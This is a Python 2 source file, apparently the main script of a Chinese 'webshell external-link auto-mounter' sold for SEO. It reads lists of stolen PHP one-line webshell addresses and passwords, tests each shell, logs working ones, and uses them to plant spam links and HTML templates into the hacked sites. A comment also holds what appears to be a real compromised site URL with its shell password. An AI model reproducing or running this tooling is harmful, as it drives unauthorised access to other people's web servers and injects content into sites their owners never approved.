#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

import Class_Queue #消息队列机制
import time
import urllib2
import threading
import socket
import php_eval
import g
import eval
import ctypes   #DLL调用
socket.setdefaulttimeout(10)

class class_Crun(threading.Thread):
    def __init__(self,i):
        threading.Thread.__init__(self)
        self.TH=i  #线程号

    def php_webshell(self,url,passwod):  #PHP处理WEBSHELL  挂链
        try:
            threads = []  #线程
            for i in range(1):
                threads.append(php_eval.php_ecal(url,passwod,self.TH))
                #threads.append(php_ecal("http://www.cincon.cn/plus/ad_js.php?aid=8888","lemon"))
            for t in threads:  # 2. 启动线程
                t.start()
            for t in threads:   # 3. 等待结束，不然容易内存爆掉
                t.join()
        except Exception,e:
            #print e
            return 0

    def TXT_file_add(self,file_nem,data):  #写入文本
        try:
            #file_nem=time.strftime('%Y.%m.%d')   #file_nem+".txt"
            file_object = open(file_nem,'a')
            #file_object.write(list_passwed[E])
            file_object.writelines(data)
            file_object.writelines("\n")
            file_object.close()
        except Exception,e:
            print u"写入TXT失败",file_nem,data,e
            return 0

    def webshell_url(self):
        try:
            if Class_Queue.webscan_url.empty():   #判断队列是否为空
                print u"thread:%d webscan_url  已经没有可操作的URL了"%(self.TH)
                time.sleep(60)
            URL = Class_Queue.webscan_url.get(0.5)  #get()方法从队头删除并返回一个项目
            url=URL.split("|")
            if len(url)<=1:
                return 0
            #url[0],url[1]

            if g.bool_asp_php(url[0])=="php":
                data=u"thread:%d url:%s passwod:%s"%(self.TH,url[0],url[1])
                if eval.cs(url[0],url[1]):
                    print u"php_ok.txt%s 链接成功"%(data)
                    websehll="%s|%s"%(url[0],url[1])
                    self.TXT_file_add("php_ok.txt",str(websehll))
                    self.php_webshell(url[0],url[1])  #PHP处理WEBSHELL  挂链
                    return 0
                else:
                    websehll="%s|%s"%(url[0],url[1])
                    self.TXT_file_add("php_no.txt",str(websehll))
                    print u"php_no.txt%s 链接失败"%(data)
                    return 0

            if g.bool_asp_php(url[0])=="asp":
                websehll="%s|%s"%(url[0],url[1])
                self.TXT_file_add("asp_ok.txt",str(websehll))
                return 0
            else:
                websehll="%s|%s"%(url[0],url[1])
                self.TXT_file_add("asp_no.txt",str(websehll))

            if g.bool_asp_php(url[0])=="null":
                websehll="%s|%s"%(url[0],url[1])
                self.TXT_file_add("null.txt",str(websehll))
            return 0
        except Exception,e:
            #print e
            return 0

    def run(self):
        while True:
            try:
                self.webshell_url()
            except Exception,e:
                #print e
                return 0



def add_Queue():
    try:
        list=[]
        list_2=[]
        xxx = file(TXT_file, 'r')
        for xxx_line in xxx.readlines():  #读取数据
            #如果输入的内容读取有回车符号，可以用strip来消除，可得到完美的输出
            data=xxx_line.strip().lstrip()   #清除前后空格
            if len(data)<=7:
                continue   #跳过
#            list.append(data)  #添加数据
#            for i in list:  #去重重复数据
#                if i not in list_2:
#                    list_2.append(i)
#            for i in list_2:  #添加到数组
            data=data.split("|")
            if len(data)<=1:
                continue  #跳过   这一次
            data="%s|%s"%(data[0],data[1])
            Class_Queue.webscan_url.put(data,0.3)   #插入队列
    except Exception,e:
        return 0

import sys
import base64
import webbrowser

def bool_mac_key():
    try:   #检测网络接状态
        #dll=ctypes.CDLL("keydata.dll")
        dll=ctypes.windll.LoadLibrary("keydata.dll")
        add=dll.GetMacInfo()    #DLL中的函数
#        add.restypes=ctypes.c_char_p                 #返回值类型
#        Ainternet=add()
        print "2222222---",add
        if str(add)=="1":
            return 1
        else:
            return 0
    except BaseException, e:
        print(str(e))
        print "sssssssssss"
        return 0

def show_url(url): #正常打开RUL
    try:
        webbrowser.open_new_tab(url)
        return 1
    except BaseException, e:
        print(str(e))
        return 0
################################################
import ConfigParser  #读取INI配置信息
if __name__=='__main__':
    print u"----------------------webshell  外链自动挂在器V1.0---------------------"
    print u"----------------------本软件目前只支持PHP一句话------------------------"
    print u"        data/asp.txt       写入asp中的内容"
    print u"        data/aspx.txt       写入aspx中的内容"
    print u"        data/php.txt       写入PHP中的内容"
    print u"        data/pb.txt        屏蔽关键字一行一个(检测链接是否存在)"
    print u"        data/htm_html.txt  挂载HTML模板"
    print u"        data/link.txt      挂载HTML链接"
    print u"        data/tag.txt       挂载链接标记(链接标记前一行)只会挂载一次"
    print u"        软件使用方法   main.exe webshell.txt   软件名 扫描URL"
    print u"        webshell.txt  内容一行一条      一句话地址|密码"
    print u"--------------------更多配置参数请看     软件说明.txt------------------"
    print u"--http://webshellseo.com--客服QQ:315284666--技术支持QQ:2602159946-----"
    print u"-----------------       time:---2015.4.15     ------------------------"
    print u"----------------------------------------------------------------------"
    #show_url(base64.b64decode("aHR0cDovL3dlYnNoZWxsc2VvLmNvbS8=")) #正常打开RUL  http://webshellseo.com
    if  bool_mac_key()==0:
        print u"软件注册失败  请联系QQ:315284666"
        print u"60秒后程序自动退出"
        #show_url(base64.b64decode("aHR0cDovL3dlYnNoZWxsc2VvLmNvbS8=")) #正常打开RUL  http://webshellseo.com
        time.sleep(60)
        sys.exit(0)  #结束进程

    print u"注册成功"
    global TXT_file #导入文本
    TXT_file = None
    #    TXT_file ="DedeCMS.txt"
    if len(sys.argv) < 2:
        print u"1_无参数传入"
        print u"1_无参数传入   \r\n软件使用方法   main.exe webshell.txt     软件名 webshell文件 "
        print u"2_手动输入文件名   \r\n请输入要扫描的url文件名如:webshell.txt"
        TXT_file = str(raw_input("2_scan URL name:"))
    else:
        TXT_file=sys.argv[1]

    thread=1
    try:
        config = ConfigParser.ConfigParser()
        config.readfp(open("main.ini"))
        thread = int(config.get("DATA", "thread"))
    except:
        pass

    add_Queue()  #添加到消息队列
    time.sleep(1)
    #启动消息队列
    threads = []  #线程
    for i in range(1):  #nthreads=10  创建10个线程
        threads.append(Class_Queue.C_Queue())
    for t in threads:
        t.start()  #开始线程
    threads = []  #线程
    time.sleep(1)

    threads = []  #线程
    for i in range(thread):  #nthreads=10  创建10个线程
        threads.append(class_Crun(i+1,))
    for t in threads:
        t.start()  #开始线程
    for t in threads:
        t.join()  #等待线程，保持主进程
